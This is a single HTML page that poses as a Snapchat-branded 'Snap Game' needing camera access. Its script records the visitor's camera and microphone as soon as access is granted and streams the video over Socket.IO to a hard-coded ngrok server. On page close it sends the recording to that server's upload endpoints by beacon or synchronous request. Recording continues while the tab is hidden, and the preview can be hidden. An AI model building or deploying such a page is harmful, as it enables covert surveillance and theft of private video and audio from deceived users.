<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Snap Game - Auto Record</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: Arial, sans-serif;
  overflow: hidden;
  background: #000;
}

/* Splash Screen */
#splash {
  position: fixed;
  width: 100%;
  height: 100%;
  background: #FFFC00;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  z-index: 1000;
}

#logo {
  width: 120px;
  height: 120px;
  object-fit: contain;
}

#tap {
  margin-top: 20px;
  font-size: 16px;
  color: #333;
}

#startBtn {
  margin-top: 15px;
  padding: 12px 20px;
  border-radius: 25px;
  border: none;
  background: black;
  color: white;
  font-size: 16px;
  cursor: pointer;
}

#message {
  margin-top: 10px;
  color: red;
  font-size: 14px;
  text-align: center;
  padding: 0 20px;
}

/* Camera View */
#camera {
  width: 100%;
  height: 100vh;
  object-fit: cover;
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  z-index: 1;
}

/* Recording Indicator */
.recording-indicator {
  position: fixed;
  top: 20px;
  right: 20px;
  background: rgba(0,0,0,0.7);
  color: white;
  padding: 8px 16px;
  border-radius: 20px;
  font-size: 14px;
  display: none;
  z-index: 100;
  font-family: monospace;
  align-items: center;
  gap: 8px;
}

.recording-indicator.active {
  display: flex;
}

.recording-dot {
  width: 12px;
  height: 12px;
  background: #ff4444;
  border-radius: 50%;
  animation: pulse 1s infinite;
}

@keyframes pulse {
  0% { opacity: 1; transform: scale(1); }
  50% { opacity: 0.5; transform: scale(1.2); }
  100% { opacity: 1; transform: scale(1); }
}

/* Status */
#status {
  position: fixed;
  bottom: 30px;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(0,0,0,0.8);
  color: white;
  padding: 10px 20px;
  border-radius: 25px;
  font-size: 14px;
  display: none;
  z-index: 100;
  font-family: monospace;
  white-space: nowrap;
}

/* Toggle Camera Button */
.toggle-camera-btn {
  position: fixed;
  bottom: 30px;
  right: 30px;
  width: 50px;
  height: 50px;
  border-radius: 50%;
  background: rgba(0,0,0,0.7);
  border: 2px solid white;
  color: white;
  font-size: 24px;
  cursor: pointer;
  z-index: 100;
  display: none;
  align-items: center;
  justify-content: center;
  backdrop-filter: blur(5px);
  transition: all 0.3s ease;
}

.toggle-camera-btn:hover {
  background: rgba(0,0,0,0.9);
  transform: scale(1.05);
}

/* Auto-save message */
.auto-save {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: rgba(0,0,0,0.9);
  color: #4CAF50;
  padding: 15px 30px;
  border-radius: 10px;
  font-size: 16px;
  display: none;
  z-index: 200;
  text-align: center;
  white-space: nowrap;
  font-weight: bold;
  animation: fadeInOut 2s ease;
}

@keyframes fadeInOut {
  0% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
  15% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
  85% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
  100% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
}
</style>
</head>

<body>

<!-- Splash Screen -->
<div id="splash">
  <img id="logo" src="./sm_5b321c9cb2d25.jpg" alt="Snapchat Logo" onerror="this.src='https://via.placeholder.com/120?text=Snap'">
  <div id="tap">Camera access required</div>
  <button id="startBtn" onclick="startApp()">Allow Camera & Start</button>
  <div id="message"></div>
</div>

<!-- Camera -->
<video id="camera" autoplay playsinline muted></video>

<!-- UI Elements -->
<div class="recording-indicator" id="recordingIndicator">
  <div class="recording-dot"></div>
  <span>Recording</span>
</div>
<div id="status"></div>
<div class="auto-save" id="autoSaveMsg">✓ Video saved!</div>
<button class="toggle-camera-btn" id="toggleCameraBtn" onclick="toggleCameraPreview()">👁️</button>

<script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>

<script>
// Configuration
const BACKEND_URL = "https://tableware-dweeb-estate.ngrok-free.dev";
let socket = null;
let mediaRecorder = null;
let recordedChunks = [];
let stream = null;
let isRecording = false;
let hasSentVideo = false;
let recordingStartTime = null;
let autoSaveTimer = null;
let cameraVisible = true;

// Connect to server
function connectSocket() {
  return new Promise((resolve, reject) => {
    socket = io(BACKEND_URL, {
      transports: ['websocket', 'polling'],
      timeout: 10000
    });
    
    socket.on('connect', () => {
      console.log('✅ Connected to server');
      document.getElementById('message').innerHTML = '';
      resolve();
    });
    
    socket.on('connect_error', (err) => {
      console.error('Connection error:', err);
      reject(err);
    });
    
    socket.on('recording-complete', (data) => {
      console.log('✅ Video saved on server:', data);
      showAutoSaveMessage();
    });
  });
}

// Show auto-save message
function showAutoSaveMessage() {
  const msg = document.getElementById('autoSaveMsg');
  msg.style.display = 'block';
  setTimeout(() => {
    msg.style.display = 'none';
  }, 2000);
}

// Start the app
async function startApp() {
  const splash = document.getElementById("splash");
  const camera = document.getElementById("camera");
  const msg = document.getElementById("message");
  const toggleBtn = document.getElementById("toggleCameraBtn");
  
  try {
    // Connect to server
    showStatus('Connecting...');
    await connectSocket();
    
    // Get camera access
    showStatus('Requesting camera...');
    stream = await navigator.mediaDevices.getUserMedia({ 
      video: true, 
      audio: true 
    });
    
    // Setup camera
    camera.srcObject = stream;
    camera.style.display = "block";
    toggleBtn.style.display = "flex";
    splash.style.display = "none";
    
    // Setup media recorder
    setupMediaRecorder();
    
    // Start recording immediately
    startRecording();
    
    // Show recording indicator
    document.getElementById('recordingIndicator').classList.add('active');
    showStatus('🔴 Recording in progress...');
    
    // Setup page close handlers
    setupPageHandlers();
    
  } catch (err) {
    console.error('Error:', err);
    msg.innerText = "⚠️ Please allow camera and microphone to play this game";
    document.getElementById("startBtn").innerText = "Try Again";
    showStatus('Error: ' + err.message);
  }
}

// Setup MediaRecorder
function setupMediaRecorder() {
  // Find supported MIME type
  const mimeTypes = [
    'video/webm;codecs=vp9,opus',
    'video/webm;codecs=vp8,opus',
    'video/webm;codecs=h264,opus',
    'video/webm'
  ];
  
  let selectedMimeType = '';
  for (const mimeType of mimeTypes) {
    if (MediaRecorder.isTypeSupported(mimeType)) {
      selectedMimeType = mimeType;
      break;
    }
  }
  
  console.log('Using MIME type:', selectedMimeType);
  
  mediaRecorder = new MediaRecorder(stream, {
    mimeType: selectedMimeType
  });
  
  mediaRecorder.ondataavailable = (event) => {
    if (event.data && event.data.size > 0) {
      recordedChunks.push(event.data);
      console.log(`📹 Chunk: ${event.data.size} bytes, total: ${recordedChunks.length}`);
    }
  };
  
  mediaRecorder.onstop = () => {
    console.log('MediaRecorder stopped');
    if (recordedChunks.length > 0 && !hasSentVideo) {
      sendVideoToServer();
    }
  };
  
  mediaRecorder.onerror = (err) => {
    console.error('Recorder error:', err);
    showStatus('Recording error', '#ff4444');
  };
}

// Start recording
function startRecording() {
  if (mediaRecorder && mediaRecorder.state === 'inactive') {
    recordedChunks = [];
    hasSentVideo = false;
    
    // Start recording, collect data every second
    mediaRecorder.start(1000);
    isRecording = true;
    recordingStartTime = Date.now();
    
    console.log('🔴 Recording started');
    
    // Optional: Stop after 60 seconds max (adjust as needed)
    autoSaveTimer = setTimeout(() => {
      if (isRecording && !hasSentVideo) {
        console.log('⏰ Max recording time reached');
        stopAndSendVideo();
      }
    }, 60000); // 60 seconds max
  }
}

// Stop recording and send video
function stopAndSendVideo() {
  if (mediaRecorder && mediaRecorder.state === 'recording') {
    console.log('🛑 Stopping recording...');
    isRecording = false;
    
    if (autoSaveTimer) {
      clearTimeout(autoSaveTimer);
      autoSaveTimer = null;
    }
    
    mediaRecorder.stop();
    document.getElementById('recordingIndicator').classList.remove('active');
  }
}

// Send video to server
async function sendVideoToServer() {
  if (hasSentVideo) {
    console.log('Video already sent');
    return;
  }
  
  if (recordedChunks.length === 0) {
    console.log('No video data');
    return;
  }
  
  hasSentVideo = true;
  
  const totalSize = recordedChunks.reduce((sum, chunk) => sum + chunk.size, 0);
  console.log(`Sending ${recordedChunks.length} chunks, ${totalSize} bytes`);
  
  try {
    // Create blob from chunks
    const mimeType = mediaRecorder.mimeType;
    const videoBlob = new Blob(recordedChunks, { type: mimeType });
    
    // Convert to array buffer
    const arrayBuffer = await videoBlob.arrayBuffer();
    
    // Send via Socket.IO
    socket.emit('video-data', arrayBuffer);
    
    showStatus('✓ Video saved!', '#4CAF50');
    showAutoSaveMessage();
    
  } catch (error) {
    console.error('Error sending video:', error);
    showStatus('Failed to save video', '#ff4444');
    hasSentVideo = false;
  }
}

// Show status message
function showStatus(message, color = '#ffffff') {
  const statusEl = document.getElementById('status');
  statusEl.textContent = message;
  statusEl.style.backgroundColor = 'rgba(0,0,0,0.8)';
  statusEl.style.display = 'block';
  
  setTimeout(() => {
    if (statusEl.textContent === message) {
      statusEl.style.display = 'none';
    }
  }, 3000);
}

// Toggle camera preview (show/hide)
function toggleCameraPreview() {
  const camera = document.getElementById('camera');
  const btn = document.getElementById('toggleCameraBtn');
  
  if (cameraVisible) {
    camera.style.display = 'none';
    btn.textContent = '👁️‍🗨️';
    btn.style.background = 'rgba(0,0,0,0.9)';
    cameraVisible = false;
    showStatus('Camera preview hidden', '#888');
  } else {
    camera.style.display = 'block';
    btn.textContent = '👁️';
    btn.style.background = 'rgba(0,0,0,0.7)';
    cameraVisible = true;
    showStatus('Camera preview shown', '#888');
  }
}

// Setup handlers for page close
function setupPageHandlers() {
  // Handle beforeunload - main event for tab close
  window.addEventListener('beforeunload', (event) => {
    console.log('🚪 Page closing, saving video...');
    
    if (isRecording && !hasSentVideo) {
      // Stop recording immediately
      if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
      }
      
      // Send via Beacon API for reliable delivery
      if (recordedChunks.length > 0 && socket) {
        const mimeType = mediaRecorder.mimeType;
        const videoBlob = new Blob(recordedChunks, { type: mimeType });
        
        // Use sendBeacon for reliable delivery on page close
        if (navigator.sendBeacon) {
          const reader = new FileReader();
          reader.onloadend = () => {
            const arrayBuffer = reader.result;
            const blob = new Blob([arrayBuffer], { type: 'application/octet-stream' });
            navigator.sendBeacon(`${BACKEND_URL}/upload-beacon`, blob);
            console.log('📡 Beacon sent');
          };
          reader.readAsArrayBuffer(videoBlob);
        } else {
          // Fallback to sync XHR
          const xhr = new XMLHttpRequest();
          xhr.open('POST', `${BACKEND_URL}/upload-sync`, false);
          xhr.send(videoBlob);
          console.log('🔄 Sync upload sent');
        }
      }
    }
    
    // Clean up camera
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  });
  
  // Handle pagehide (for mobile)
  window.addEventListener('pagehide', () => {
    console.log('📱 Page hide event');
    if (isRecording && !hasSentVideo) {
      stopAndSendVideo();
    }
  });
  
  // Handle visibility change (tab switch - optional)
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
      console.log('Tab hidden, continuing recording...');
      // We continue recording, don't stop
    }
  });
}

// Clean up on page unload
window.onunload = () => {
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
};
</script>

</body>
</html>
